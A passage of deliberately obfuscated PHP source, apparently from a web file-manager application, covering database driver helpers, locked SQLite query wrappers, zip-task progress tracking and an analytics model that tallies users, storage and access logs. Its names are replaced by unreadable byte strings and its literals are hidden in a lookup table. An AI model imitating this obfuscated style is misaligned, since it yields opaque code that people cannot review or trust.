$É‚óÅÉ[$¡®ğ¼£¹] = current($ÀÉû¹à); } return $É‚óÅÉ; } protected function parseLimit($¸Ï»€é) { $ğ€½Öã¨ =& $_SERVER[ÓïÕü]; $™ŞßŞÅà = $ğ€½Öã¨[12]; if (!empty($¸Ï»€é)) { switch ($this->dbType) { case $ğ€½Öã¨[1048]: case $ğ€½Öã¨[1040]: $¸Ï»€é = explode($ğ€½Öã¨[50], $¸Ï»€é); if (count($¸Ï»€é) > 1) { $™ŞßŞÅà .= $ğ€½Öã¨[51] . $¸Ï»€é[1] . $ğ€½Öã¨[52] . $¸Ï»€é[0] . $ğ€½Öã¨[53]; } else { $™ŞßŞÅà .= $ğ€½Öã¨[51] . $¸Ï»€é[0] . $ğ€½Öã¨[53]; } break; case $ğ€½Öã¨[1021]: case $ğ€½Öã¨[1039]: break; case $ğ€½Öã¨[1023]: break; case $ğ€½Öã¨[1022]: case $ğ€½Öã¨[1024]: break; case $ğ€½Öã¨[1051]: default: $™ŞßŞÅà .= $ğ€½Öã¨[51] . $¸Ï»€é . $ğ€½Öã¨[53]; } } return $™ŞßŞÅà; } public function parseKey(&$ş¡ÒØ²€, $ÙÁÍº›ˆ = true) { $á‰Êó‘ª =& $_SERVER[ÓïÕü]; if ($ÙÁÍº›ˆ) { $ş¡ÒØ²€ = $this->parseKeyCheck($ş¡ÒØ²€); } if ($this->dbType == $á‰Êó‘ª[1051]) { if ($ş¡ÒØ²€ != $á‰Êó‘ª[223] && !preg_match($á‰Êó‘ª[1015], $ş¡ÒØ²€)) { $ş¡ÒØ²€ = $á‰Êó‘ª[464] . trim($ş¡ÒØ²€, $á‰Êó‘ª[464]) . $á‰Êó‘ª[464]; } return $ş¡ÒØ²€; } else { return parent::parseKey($ş¡ÒØ²€, $ÙÁÍº›ˆ); } } public function close() { $this->_linkID = null; } public function error() { $¼­™Ôáİ =& $_SERVER[ÓïÕü]; if ($this->PDOStatement) { $İÍƒ‚ı = $this->PDOStatement->errorInfo(); $this->error = $İÍƒ‚ı[1] . $¼­™Ôáİ[4] . $İÍƒ‚ı[2]; } else { $this->error = $¼­™Ôáİ[12]; } if ($¼­™Ôáİ[12] != $this->queryStr) { $this->error .= LNG($¼­™Ôáİ[48]) . $this->queryStr; } think_trace($this->error, $¼­™Ôáİ[12], $¼­™Ôáİ[49]); return $this->error; } public function escapeString($ßò÷‡Øî) { $Ïá’œªå =& $_SERVER[ÓïÕü]; switch ($this->dbType) { case $Ïá’œªå[1048]: case $Ïá’œªå[1021]: case $Ïá’œªå[1039]: case $Ïá’œªå[1051]: return addslashes($ßò÷‡Øî); case $Ïá’œªå[1023]: case $Ïá’œªå[1040]: case $Ïá’œªå[1022]: case $Ïá’œªå[1024]: return str_ireplace($Ïá’œªå[58], $Ïá’œªå[59], $ßò÷‡Øî); } } protected function parseValue($ğÉÅØÛú) { $ÑÅ§É¢– =& $_SERVER[ÓïÕü]; if (is_string($ğÉÅØÛú)) { $Ã¨Ğ¿ = strpos($ğÉÅØÛú, $ÑÅ§É¢–[4]) === 0 && in_array($ğÉÅØÛú, array_keys($this->bind)); $ğÉÅØÛú = $Ã¨Ğ¿ ? $this->escapeString($ğÉÅØÛú) : $ÑÅ§É¢–[1061] . $this->escapeString($ğÉÅØÛú) . $ÑÅ§É¢–[1061]; } elseif (isset($ğÉÅØÛú[0]) && is_string($ğÉÅØÛú[0]) && strtolower($ğÉÅØÛú[0]) == $ÑÅ§É¢–[375]) { $ğÉÅØÛú = $this->escapeString($ğÉÅØÛú[1]); } elseif (is_array($ğÉÅØÛú)) { $ğÉÅØÛú = array_map(array($this, $ÑÅ§É¢–[1062]), $ğÉÅØÛú); } elseif (is_bool($ğÉÅØÛú)) { $ğÉÅØÛú = $ğÉÅØÛú ? $ÑÅ§É¢–[91] : $ÑÅ§É¢–[231]; } elseif (is_null($ğÉÅØÛú)) { $ğÉÅØÛú = $ÑÅ§É¢–[106]; } return $ğÉÅØÛú; } public function getLastInsertId() { $Ü’ÙÃûœ =& $_SERVER[ÓïÕü]; switch ($this->dbType) { case $Ü’ÙÃûœ[1048]: case $Ü’ÙÃûœ[1040]: case $Ü’ÙÃûœ[1021]: case $Ü’ÙÃûœ[1039]: case $Ü’ÙÃûœ[1023]: case $Ü’ÙÃûœ[1051]: return $this->_linkID->lastInsertId(); case $Ü’ÙÃûœ[1022]: case $Ü’ÙÃûœ[1024]: $Âì¼Ä²£ = $this->table; $İüô°¾Ê = $this->query("\123\105\x4c\x45\x43\x54\x20{$Âì¼Ä²£}\56\x63\165\x72\162\x76\x61\154\40\143\165\x72\162\x76\141\x6c\x20\x46\x52\x4f\x4d\x20\144\x75\x61\154"); return $İüô°¾Ê ? $İüô°¾Ê[0][$Ü’ÙÃûœ[1063]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($Öø›¶¨) { $ŠœÇ÷‰… =& $_SERVER[ÓïÕü]; if (!CacheLock::fileLock($ŠœÇ÷‰…[13])) { return !1; } $½áµğ£ü = parent::query($Öø›¶¨); CacheLock::fileUnLock($ŠœÇ÷‰…[13]); return $½áµğ£ü; } public function execute($§ƒå°õ£) { $¹ÊÄÙÁ• =& $_SERVER[ÓïÕü]; if (!CacheLock::fileLock($¹ÊÄÙÁ•[13])) { return !1; } $Ì¤‚ô™¤ = parent::execute($§ƒå°õ£); CacheLock::fileUnLock($¹ÊÄÙÁ•[13]); return $Ì¤‚ô™¤; } } class DbSqlite3 extends DbSqlite3Base { public function query($ÍßœÊÀä) { $ôˆÆ©Á¸ =& $_SERVER[ÓïÕü]; if (!CacheLock::fileLock($ôˆÆ©Á¸[13])) { return !1; } $Ğç²ğí¹ = parent::query($ÍßœÊÀä); CacheLock::fileUnLock($ôˆÆ©Á¸[13]); return $Ğç²ğí¹; } public function execute($¡æ¦ö©À) { $ìíŸ„© =& $_SERVER[ÓïÕü]; if (!CacheLock::fileLock($ìíŸ„©[13])) { return !1; } $©ùØœãø = parent::execute($¡æ¦ö©À); CacheLock::fileUnLock($ìíŸ„©[13]); return $©ùØœãø; } } goto eÁ‚„¬Åá; a¥ğ«ÓÌ‚ø: class TaskZip extends TaskFileTransfer { protected function startAfter() { $Ô“¸£  =& $_SERVER[ÓïÕü]; parent::startAfter(); Hook::bind($Ô“¸£ [1932], array($this, $Ô“¸£ [1922])); Hook::bind($Ô“¸£ [1924], array($this, $Ô“¸£ [1925])); $ÇƒÅâ°× =& $this->task; $ÇƒÅâ°×[$Ô“¸£ [1926]] = $Ô“¸£ [1307]; if (!$ÇƒÅâ°×[$Ô“¸£ [1694]]) { $ÇƒÅâ°×[$Ô“¸£ [1694]] = LNG($Ô“¸£ [1933]); } } protected function endAfter() { $Ç¸¢¤ÔÁ =& $_SERVER[ÓïÕü]; parent::endAfter(); Hook::unbind($Ç¸¢¤ÔÁ[1932], array($this, $Ç¸¢¤ÔÁ[1922])); Hook::unbind($Ç¸¢¤ÔÁ[1924], array($this, $Ç¸¢¤ÔÁ[1925])); } public function updateAfter() { $¬ĞÄéèÇ =& $_SERVER[ÓïÕü]; $ÎÎ¼‹ü =& $this->task; if (!$ÎÎ¼‹ü[$¬ĞÄéèÇ[1167]] || !$ÎÎ¼‹ü[$¬ĞÄéèÇ[854]]) { return; } if ($ÎÎ¼‹ü[$¬ĞÄéèÇ[1926]] == $¬ĞÄéèÇ[1307]) { $‹È‚É« = $ÎÎ¼‹ü[$¬ĞÄéèÇ[1861]]; if ($ÎÎ¼‹ü[$¬ĞÄéèÇ[1862]] != $¬ĞÄéèÇ[1307]) { $‹È‚É« = 0; } $Ö«‰óıà = ($ÎÎ¼‹ü[$¬ĞÄéèÇ[1865]] + $‹È‚É«) / $ÎÎ¼‹ü[$¬ĞÄéèÇ[854]]; $ÎÎ¼‹ü[$¬ĞÄéèÇ[1808]] = $Ö«‰óıà * 0.3; } else { if ($ÎÎ¼‹ü[$¬ĞÄéèÇ[1926]] == $¬ĞÄéèÇ[391]) { $Ö«‰óıà = $ÎÎ¼‹ü[$¬ĞÄéèÇ[1807]] / $ÎÎ¼‹ü[$¬ĞÄéèÇ[1167]]; $ÎÎ¼‹ü[$¬ĞÄéèÇ[1808]] = 0.3 + $Ö«‰óıà * 0.5; } else { if ($ÎÎ¼‹ü[$¬ĞÄéèÇ[1926]] == $¬ĞÄéèÇ[110]) { $Ö«‰óıà = 0; if ($ÎÎ¼‹ü[$¬ĞÄéèÇ[1860]]) { $Ö«‰óıà = $ÎÎ¼‹ü[$¬ĞÄéèÇ[1861]] / $ÎÎ¼‹ü[$¬ĞÄéèÇ[1860]]; } $ÎÎ¼‹ü[$¬ĞÄéèÇ[1808]] = 0.3 + 0.5 + $Ö«‰óıà * 0.2; } } } if ($ÎÎ¼‹ü[$¬ĞÄéèÇ[1808]] > 0) { $õíø¡­Ú = timeFloat() - $ÎÎ¼‹ü[$¬ĞÄéèÇ[1810]] - $ÎÎ¼‹ü[$¬ĞÄéèÇ[1813]]; $ÎÎ¼‹ü[$¬ĞÄéèÇ[1814]] = $õíø¡­Ú * (1 - $ÎÎ¼‹ü[$¬ĞÄéèÇ[1808]]) / $ÎÎ¼‹ü[$¬ĞÄéèÇ[1808]]; } } public function copyFileStart($ÏÅ¬‘Æ¢, $íÖÆà÷, $İ¢šø, $ßÓí”êÄ, $ÊÓÈÌÄá, $ù‘•…Ã) { $É§ĞàÆì =& $_SERVER[ÓïÕü]; parent::copyFileStart($ÏÅ¬‘Æ¢, $íÖÆà÷, $İ¢šø, $ßÓí”êÄ, $ÊÓÈÌÄá, $ù‘•…Ã); $çüíĞ¶ª =& $this->task; if ($çüíĞ¶ª[$É§ĞàÆì[1926]] == $É§ĞàÆì[391]) { $çüíĞ¶ª[$É§ĞàÆì[1926]] = $É§ĞàÆì[110]; } $this->update(); } public function copyFileEnd($‚Ÿ––¼ç, $Ü—‚™, $Öƒ¬ÎŒ, $³´ˆôŞ‚, $©âæÂ¥‘, $°å”‹ñä) { $³Ø³³ğÚ =& $_SERVER[ÓïÕü]; $ö‚Îãô =& $this->task; $ö‚Îãô[$³Ø³³ğÚ[1861]] = $ö‚Îãô[$³Ø³³ğÚ[1860]]; $ö‚Îãô[$³Ø³³ğÚ[1865]] += $ö‚Îãô[$³Ø³³ğÚ[1860]]; $ö‚Îãô[$³Ø³³ğÚ[1862]] = $³Ø³³ğÚ[12]; $this->update(); } public function zipEvent($àÇŸçÂ±, $§ñ½ÛÀò, $Çåé¦”Á, $ˆ¹ÏğÛ) { $²×Àœ„ =& $_SERVER[ÓïÕü]; $ş°ŒöÂ‰ =& $this->task; $ş°ŒöÂ‰[$²×Àœ„[1858]] = get_path_this($§ñ½ÛÀò); $ş°ŒöÂ‰[$²×Àœ„[1860]] = $ˆ¹ÏğÛ; $ş°ŒöÂ‰[$²×Àœ„[1861]] = $Çåé¦”Á; $ş°ŒöÂ‰[$²×Àœ„[1169]] = $àÇŸçÂ± == $²×Àœ„[1934] ? $²×Àœ„[1929] : $²×Àœ„[1930]; $ş°ŒöÂ‰[$²×Àœ„[1862]] = $²×Àœ„[12]; $ş°ŒöÂ‰[$²×Àœ„[854]] = $ˆ¹ÏğÛ; $ş°ŒöÂ‰[$²×Àœ„[1926]] = $²×Àœ„[391]; $this->update(); } public function nameParse($å¢¢ãËğ) { $±ò”ª¯œ =& $_SERVER[ÓïÕü]; $áÃ†®ãé =& $this->task; if ($áÃ†®ãé[$±ò”ª¯œ[1807]] < $áÃ†®ãé[$±ò”ª¯œ[1167]]) { $ËûéÓß˜ = get_path_this($å¢¢ãËğ); if (strstr($ËûéÓß˜, $±ò”ª¯œ[10])) { $áÃ†®ãé[$±ò”ª¯œ[1807]] += 1; } } if ($áÃ†®ãé[$±ò”ª¯œ[1926]] == $±ò”ª¯œ[1307]) { $áÃ†®ãé[$±ò”ª¯œ[1926]] = $±ò”ª¯œ[391]; } $áÃ†®ãé[$±ò”ª¯œ[1858]] = $å¢¢ãËğ; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($ğ”ôˆ„ä) { $µ÷Œà£ã =& $_SERVER[ÓïÕü]; $¸ïõğö¨ = array($µ÷Œà£ã[670] => array($µ÷Œà£ã[33] => $µ÷Œà£ã[1935], $µ÷Œà£ã[353] => array($µ÷Œà£ã[285], $µ÷Œà£ã[856], $µ÷Œà£ã[1936], $µ÷Œà£ã[1937])), $µ÷Œà£ã[1938] => array($µ÷Œà£ã[33] => $µ÷Œà£ã[1939], $µ÷Œà£ã[353] => array($µ÷Œà£ã[285], $µ÷Œà£ã[854], $µ÷Œà£ã[1940], $µ÷Œà£ã[1941], $µ÷Œà£ã[1942]))); if (!isset($¸ïõğö¨[$ğ”ôˆ„ä])) { return !1; } $this->optionType = $¸ïõğö¨[$ğ”ôˆ„ä][$µ÷Œà£ã[33]]; $this->field = $¸ïõğö¨[$ğ”ôˆ„ä][$µ÷Œà£ã[353]]; return !0; } public function listData($ÏêÒƒ = false, $şûÌÙú = "\155\157\144\x69\146\171\124\x69\155\x65", $çù¡ş¢õ = false) { return parent::listData($ÏêÒƒ, $şûÌÙú, $çù¡ş¢õ); } public function trendList($õ…ğú) { $ı—õÂÅ• =& $_SERVER[ÓïÕü]; $â‰©ÓÉ™ = $this->listData(); if ($â‰©ÓÉ™) { $Ò‚Ù«À = end($â‰©ÓÉ™); $‘ä¼®¢ = date($ı—õÂÅ•[1943], strtotime($ı—õÂÅ•[1944])); if ($Ò‚Ù«À[$ı—õÂÅ•[285]] == $‘ä¼®¢) { return $â‰©ÓÉ™; } $ì–Äªî÷ = strtotime($Ò‚Ù«À[$ı—õÂÅ•[285]]); } if (!isset($ì–Äªî÷)) { $¤ø¥¤ãƒ = $õ…ğú == $ı—õÂÅ•[670] ? $ı—õÂÅ•[602] : $ı—õÂÅ•[921]; $ì–Äªî÷ = Model($¤ø¥¤ãƒ)->min($ı—õÂÅ•[234]); } $ØºÉ²Í² = $ı—õÂÅ•[1945] . ucfirst($õ…ğú); $Öü¢ƒå = $this->dateList($ì–Äªî÷); foreach ($Öü¢ƒå as $‘ä¼®¢) { $this->{$ØºÉ²Í²}($‘ä¼®¢); } return $this->listData(); } private function dateList($¡å“îë£) { $’Öê´¢¹ =& $_SERVER[ÓïÕü]; $…şäğüÔ = $¡å“îë£; $ä™·ôó‘ = strtotime($’Öê´¢¹[1944]); $îŞï–İà = array(); while ($…şäğüÔ <= $ä™·ôó‘) { $îŞï–İà[] = date($’Öê´¢¹[1943], $…şäğüÔ); $…şäğüÔ = strtotime($’Öê´¢¹[1946], $…şäğüÔ); } return $îŞï–İà; } public function _recordUser($ëòÁÅÛ€ = '') { $ãÑ¾Ñ§ş =& $_SERVER[ÓïÕü]; $Ì®î…†€ = strtotime(date($ãÑ¾Ñ§ş[1947], strtotime($ëòÁÅÛ€))); $‡İİ§• = strtotime(date($ãÑ¾Ñ§ş[1948], strtotime($ëòÁÅÛ€))); $ßÏ ŒßÃ = array($ãÑ¾Ñ§ş[234] => array($ãÑ¾Ñ§ş[1117], $‡İİ§•)); $“š²üÜ‘ = Model($ãÑ¾Ñ§ş[602])->where($ßÏ ŒßÃ)->count($ãÑ¾Ñ§ş[1806]); $ßÏ ŒßÃ[$ãÑ¾Ñ§ş[234]] = array($ãÑ¾Ñ§ş[411], array($Ì®î…†€, $‡İİ§•)); $€õ•¨äú = Model($ãÑ¾Ñ§ş[602])->where($ßÏ ŒßÃ)->count($ãÑ¾Ñ§ş[1806]); $ßÏ ŒßÃ[$ãÑ¾Ñ§ş[33]] = $ãÑ¾Ñ§ş[1949]; $Ú™“Ş¾œ = Model($ãÑ¾Ñ§ş[1950])->where($ßÏ ŒßÃ)->count($ãÑ¾Ñ§ş[1951]); $ÁÊ = array($ãÑ¾Ñ§ş[285] => $ëòÁÅÛ€, $ãÑ¾Ñ§ş[856] => (int) $“š²üÜ‘, $ãÑ¾Ñ§ş[1936] => (int) $€õ•¨äú, $ãÑ¾Ñ§ş[1937] => (int) $Ú™“Ş¾œ); return $this->insert($ÁÊ); } public function _recordStore($ñÒ×â‘Ö = '') { $¹æ²Ÿõş =& $_SERVER[ÓïÕü]; $šÊòÂàç = strtotime(date($¹æ²Ÿõş[1948], strtotime($ñÒ×â‘Ö))); $¨À‚Ş™½ = array($¹æ²Ÿõş[234] => array($¹æ²Ÿõş[1117], $šÊòÂàç)); $à×Óï€ = Model($¹æ²Ÿõş[549])->where($¨À‚Ş™½)->sum($¹æ²Ÿõş[79]); $¨À‚Ş™½[$¹æ²Ÿõş[488]] = 0; $ßë¡Ï¡® = Model($¹æ²Ÿõş[921])->where($¨À‚Ş™½)->sum($¹æ²Ÿõş[79]); $¨À‚Ş™½[$¹æ²Ÿõş[191]] = 1; $ù”ö¸•„ = Model($¹æ²Ÿõş[921])->where($¨À‚Ş™½)->sum($¹æ²Ÿõş[79]); $¨À‚Ş™½[$¹æ²Ÿõş[191]] = 2; $Ûôµ·üÀ = Model($¹æ²Ÿõş[921])->where($¨À‚Ş™½)->sum($¹æ²Ÿõş[79]); $›ğñûùø = array($¹æ²Ÿõş[285] => $ñÒ×â‘Ö, $¹æ²Ÿõş[854] => (int) $ßë¡Ï¡®, $¹æ²Ÿõş[1940] => (int) $à×Óï€, $¹æ²Ÿõş[1941] => (int) $ù”ö¸•„, $¹æ²Ÿõş[1942] => (int) $Ûôµ·üÀ); return $this->insert($›ğñûùø); } public function trend($ÅÉ“Î“¯, $‰ãµŒé¶) { $ŸÎÀ¶ Ö =& $_SERVER[ÓïÕü]; if (!$this->init($ÅÉ“Î“¯)) { return !1; } $¹±Æ¶Ïõ = $this->trendList($ÅÉ“Î“¯); if ($¹±Æ¶Ïõ && $‰ãµŒé¶ != $ŸÎÀ¶ Ö[1778]) { $Œ­†‚ş¦ = $¹±Æ¶Ïõ[0][$ŸÎÀ¶ Ö[285]]; $ö£Ôí¢Ä = $this->validDate($‰ãµŒé¶, $Œ­†‚ş¦); $Ö•ğ‰ö¼ = array(); $Ú¥ï¾ŒÖ = array_to_keyvalue($¹±Æ¶Ïõ, $ŸÎÀ¶ Ö[285]); foreach ($ö£Ôí¢Ä as $úÇÅĞÛ) { if (isset($Ú¥ï¾ŒÖ[$úÇÅĞÛ])) { $ÃŞÜ¡½á = $Ú¥ï¾ŒÖ[$úÇÅĞÛ]; } else { $ÃŞÜ¡½á = end($¹±Æ¶Ïõ); $ÃŞÜ¡½á[$ŸÎÀ¶ Ö[285]] = $úÇÅĞÛ; if ($ÅÉ“Î“¯ == $ŸÎÀ¶ Ö[670]) { $ÃŞÜ¡½á[$ŸÎÀ¶ Ö[1936]] = $ÃŞÜ¡½á[$ŸÎÀ¶ Ö[1937]] = 0; } } $Ö•ğ‰ö¼[] = $ÃŞÜ¡½á; } $¹±Æ¶Ïõ = $Ö•ğ‰ö¼; } $£óç¬Ş = array($ŸÎÀ¶ Ö[670] => array($ŸÎÀ¶ Ö[856] => LNG($ŸÎÀ¶ Ö[1952]), $ŸÎÀ¶ Ö[1936] => LNG($ŸÎÀ¶ Ö[1953]), $ŸÎÀ¶ Ö[1937] => LNG($ŸÎÀ¶ Ö[1954])), $ŸÎÀ¶ Ö[1938] => array($ŸÎÀ¶ Ö[854] => LNG($ŸÎÀ¶ Ö[1955]), $ŸÎÀ¶ Ö[1940] => LNG($ŸÎÀ¶ Ö[1956]), $ŸÎÀ¶ Ö[1941] => LNG($ŸÎÀ¶ Ö[1957]), $ŸÎÀ¶ Ö[1942] => LNG($ŸÎÀ¶ Ö[1958]))); $Î¹ËµÚµ = array($ŸÎÀ¶ Ö[670] => $ŸÎÀ¶ Ö[1959], $ŸÎÀ¶ Ö[1938] => $ŸÎÀ¶ Ö[79]); if (empty($¹±Æ¶Ïõ)) { $úÇÅĞÛ = date($ŸÎÀ¶ Ö[1943], strtotime($ŸÎÀ¶ Ö[1944])); $´¥â€æ­ = array($ŸÎÀ¶ Ö[285] => $úÇÅĞÛ); foreach ($£óç¬Ş[$ÅÉ“Î“¯] as $ªÊ¾´¶ => $ÅÂä®•õ) { $´¥â€æ­[$ªÊ¾´¶] = 0; } $¹±Æ¶Ïõ[] = $´¥â€æ­; } $êŒÅû²ã = array(); foreach ($¹±Æ¶Ïõ as $ÅÂä®•õ) { if ($ÅÉ“Î“¯ == $ŸÎÀ¶ Ö[1938] && $ÅÂä®•õ[$ŸÎÀ¶ Ö[1940]] > $ÅÂä®•õ[$ŸÎÀ¶ Ö[854]]) { $ÅÂä®•õ[$ŸÎÀ¶ Ö[1940]] = $ÅÂä®•õ[$ŸÎÀ¶ Ö[854]]; } foreach ($£óç¬Ş[$ÅÉ“Î“¯] as $ªÊ¾´¶ => $·ÉÁù‡) { $ÃŞÜ¡½á = array($ŸÎÀ¶ Ö[285] => $ÅÂä®•õ[$ŸÎÀ¶ Ö[285]], $ŸÎÀ¶ Ö[1694] => $·ÉÁù‡); $ÃŞÜ¡½á[$Î¹ËµÚµ[$ÅÉ“Î“¯]] = isset($ÅÂä®•õ[$ªÊ¾´¶]) ? $ÅÂä®•õ[$ªÊ¾´¶] : 0; $êŒÅû²ã[] = $ÃŞÜ¡½á; } } return $êŒÅû²ã; } public function validDate($Î™êíäÚ, $­Îëìı) { $ú¸”úè =& $_SERVER[ÓïÕü]; $ı«ù“½Î = date($ú¸”úè[1943], strtotime($ú¸”úè[1944])); $ç‹‘ÅÃ¡ = array($ı«ù“½Î); switch ($Î™êíäÚ) { case $ú¸”úè[1785]: $ÉçåÁ”ñ = mktime(0, 0, 0, date($ú¸”úè[1960]), date($ú¸”úè[1487]) - date($ú¸”úè[1576]) + 7 - 7, date($ú¸”úè[1961])); $Š²®­øŒ = 0; do { $ƒï±ÀÑ = date($ú¸”úè[1943], $ÉçåÁ”ñ - 3600 * 24 * 7 * $Š²®­øŒ); $ç‹‘ÅÃ¡[] = $ƒï±ÀÑ; $Š²®­øŒ++; } while ($­Îëìı < $ƒï±ÀÑ); break; case $ú¸”úè[1783]: $Š²®­øŒ = 1; do { $†¦’€¢ = date($ú¸”úè[1962], strtotime("\55\x20{$Š²®­øŒ}\40\x6d\x6f\156\164\150\163")); $ç‹‘ÅÃ¡[] = $†¦’€¢; $Š²®­øŒ++; } while ($­Îëìı < $†¦’€¢); break; case $ú¸”úè[1963]: $…ïÔ­—¢ = (int) date($ú¸”úè[1961], strtotime($­Îëìı)); $÷°İ¯¨ß = (int) date($ú¸”úè[1961]); if ($…ïÔ­—¢ >= $÷°İ¯¨ß) { break; } for ($…ïÔ­—¢; $…ïÔ­—¢ < $÷°İ¯¨ß; $…ïÔ­—¢++) { $ç‹‘ÅÃ¡[] = $…ïÔ­—¢ . $ú¸”úè[1964]; } break; default: break; } if ($­Îëìı > end($ç‹‘ÅÃ¡)) { array_pop($ç‹‘ÅÃ¡); } sort($ç‹‘ÅÃ¡); return $ç‹‘ÅÃ¡; } public function listTable($ÎÈÖ†§É) { $ëÛÈÄ¿° = ucfirst($ÎÈÖ†§É); return Model($ëÛÈÄ¿°)->listData(); } public function option($”å‰ùÆÚ) { $÷íÄü§ß = $_SERVER[ÓïÕü][1965] . ucfirst($”å‰ùÆÚ); return $this->{$÷íÄü§ß}(); } private function optionUser() { $şÂØ¡æ =& $_SERVER[ÓïÕü]; $‡é®Ó¡¼ = Model($şÂØ¡æ[602])->count($şÂØ¡æ[1806]); $±üå = Model($şÂØ¡æ[602])->where($şÂØ¡æ[1966])->count($şÂØ¡æ[1806]); $®ş¼ÚöÎ = intval($GLOBALS[$şÂØ¡æ[6]][$şÂØ¡æ[427]][$şÂØ¡æ[1751]]) / 3600; $Ã„¦ï¸ê = strtotime("\x2d{$®ş¼ÚöÎ}\x20\x68\157\x75\162\163"); $õ¢¨¤õ = strtotime(date($şÂØ¡æ[1947])); if ($Ã„¦ï¸ê < $õ¢¨¤õ) { $Ã„¦ï¸ê = $õ¢¨¤õ; } $åÌÉÜÙ² = array($şÂØ¡æ[1967] => array($şÂØ¡æ[1118], $Ã„¦ï¸ê)); $¢öôê¿ = (int) Model($şÂØ¡æ[602])->where($åÌÉÜÙ²)->count($şÂØ¡æ[1806]); if (!$¢öôê¿) { $¢öôê¿ = 1; } $åÌÉÜÙ² = array($şÂØ¡æ[1967] => array($şÂØ¡æ[1118], $õ¢¨¤õ)); $§¸‰â¶ = Model($şÂØ¡æ[602])->where($åÌÉÜÙ²)->count($şÂØ¡æ[1806]); return array($şÂØ¡æ[849] => (int) $‡é®Ó¡¼, $şÂØ¡æ[1968] => (int) ($‡é®Ó¡¼ - $±üå), $şÂØ¡æ[1969] => (int) $±üå, $şÂØ¡æ[1970] => (int) $§¸‰â¶, $şÂØ¡æ[1971] => $¢öôê¿); } private function optionFile() { $«òºÉ½â =& $_SERVER[ÓïÕü]; $Âº‘¢¼š = $this->sourceSize(); $ªÆ€ùã« = $Âº‘¢¼š[$«òºÉ½â[79]]; $¡ƒ²³œ® = $Âº‘¢¼š[$«òºÉ½â[1940]]; $ØÛ‡²ø = Model($«òºÉ½â[921])->where(array($«òºÉ½â[488] => 0))->count($«òºÉ½â[194]); $©°¥¸íŠ = array($«òºÉ½â[488] => 0, $«òºÉ½â[234] => array($«òºÉ½â[1118], strtotime(date($«òºÉ½â[1947])))); $Äõ¹€Ã = Model($«òºÉ½â[921])->where($©°¥¸íŠ)->sum($«òºÉ½â[79]); $‘ÕèÒ³ç = Model($«òºÉ½â[921])->where($©°¥¸íŠ)->count($«òºÉ½â[194]); return array($«òºÉ½â[854] => $ªÆ€ùã«, $«òºÉ½â[1940] => $¡ƒ²³œ®, $«òºÉ½â[1972] => $ªÆ€ùã« - $¡ƒ²³œ®, $«òºÉ½â[1973] => (int) $Äõ¹€Ã, $«òºÉ½â[856] => (int) $ØÛ‡²ø, $«òºÉ½â[1974] => (int) $‘ÕèÒ³ç); } private function optionAccess() { $Õíø‚äŸ =& $_SERVER[ÓïÕü]; return array($Õíø‚äŸ[849] => $this->typeLogCnt(), $Õíø‚äŸ[110] => $this->typeLogCnt($Õíø‚äŸ[110]), $Õíø‚äŸ[528] => $this->typeLogCnt($Õíø‚äŸ[528]), $Õíø‚äŸ[1975] => $this->typeLogCnt($Õíø‚äŸ[1975]), $Õíø‚äŸ[1976] => $this->typeLogCnt($Õíø‚äŸ[1976]), $Õíø‚äŸ[670] => $this->typeLogCnt($Õíø‚äŸ[12], $Õíø‚äŸ[1951])); } private function typeLogCnt($¤Õ”çø± = '', $şò¼Œ€ = "\x69\x64") { $á‡Ÿïµ² =& $_SERVER[ÓïÕü]; $Çñ±×Ñ† = array($á‡Ÿïµ²[110] => array($á‡Ÿïµ²[1977], $á‡Ÿïµ²[1978]), $á‡Ÿïµ²[528] => array($á‡Ÿïµ²[1979], $á‡Ÿïµ²[1980]), $á‡Ÿïµ²[1975] => array($á‡Ÿïµ²[1981], $á‡Ÿïµ²[1982], $á‡Ÿïµ²[1983]), $á‡Ÿïµ²[1976] => array($á‡Ÿïµ²[1984], $á‡Ÿïµ²[1985]), $á‡Ÿïµ²[1986] => array($á‡Ÿïµ²[1987], $á‡Ÿïµ²[1988], $á‡Ÿïµ²[1989])); $ÉÈˆçîé = strtotime(date($á‡Ÿïµ²[1947])); $š›şËÄ© = array($á‡Ÿïµ²[234] => array($á‡Ÿïµ²[1118], $ÉÈˆçîé)); if ($¤Õ”çø±) { $š›şËÄ©[$á‡Ÿïµ²[33]] = array($á‡Ÿïµ²[7], $Çñ±×Ñ†[$¤Õ”çø±]); } $¢Œğá×Ò = Model($á‡Ÿïµ²[1950])->where($š›şËÄ©)->count($şò¼Œ€); return (int) $¢Œğá×Ò; } private function optionServer() { $ğ°ç¡Œ› =& $_SERVER[ÓïÕü]; $Ì°ˆ‚é„ = $this->diskDriver(); $€¬Ëö  = KodIO::defaultDriver(); $İ–¬Ñ¡  = array($ğ°ç¡Œ›[914] => $€¬Ëö [$ğ°ç¡Œ›[478]]); $±úã¸†» = Model($ğ°ç¡Œ›[549])->where($İ–¬Ñ¡ )->sum($ğ°ç¡Œ›[79]); $°‰²©è = explode($ğ°ç¡Œ›[53], $_SERVER[$ğ°ç¡Œ›[147]]); $Üº½”Û = $°‰²©è[0]; $š†ò™ ¹ = $GLOBALS[$ğ°ç¡Œ›[6]][$ğ°ç¡Œ›[21]]; $ŞŒŠ”œÜ = $š†ò™ ¹[$ğ°ç¡Œ›[1080]]; if ($ŞŒŠ”œÜ == $ğ°ç¡Œ›[1068]) { $ ‰†èğŠ = explode($ğ°ç¡Œ›[1396], $š†ò™ ¹[$ğ°ç¡Œ›[1079]]); $ŞŒŠ”œÜ = $ ‰†èğŠ[0]; } if ($ŞŒŠ”œÜ == $ğ°ç¡Œ›[1016] || $ŞŒŠ”œÜ == $ğ°ç¡Œ›[899]) { $¤¶äÂöø = Model()->db()->query($ğ°ç¡Œ›[1990]); $ƒâû«ÈÄ = $¤¶äÂöø[0] && isset($¤¶äÂöø[0][$ğ°ç¡Œ›[1693]]) ? $¤¶äÂöø[0][$ğ°ç¡Œ›[1693]] : 0; $ŞŒŠ”œÜ = $ğ°ç¡Œ›[1991] . ($ƒâû«ÈÄ ? $ğ°ç¡Œ›[8] . $ƒâû«ÈÄ : $ğ°ç¡Œ›[12]); } $¤¡šßº = $GLOBALS[$ğ°ç¡Œ›[6]][$ğ°ç¡Œ›[427]][$ğ°ç¡Œ›[923]]; return array($ğ°ç¡Œ›[1992] => $Ì°ˆ‚é„ ? $Ì°ˆ‚é„[$ğ°ç¡Œ›[1993]] : 0, $ğ°ç¡Œ›[1994] => $Ì°ˆ‚é„ ? $Ì°ˆ‚é„[$ğ°ç¡Œ›[1995]] : 0, $ğ°ç¡Œ›[1996] => (int) $€¬Ëö [$ğ°ç¡Œ›[1993]] * 1024 * 1024 * 1024, 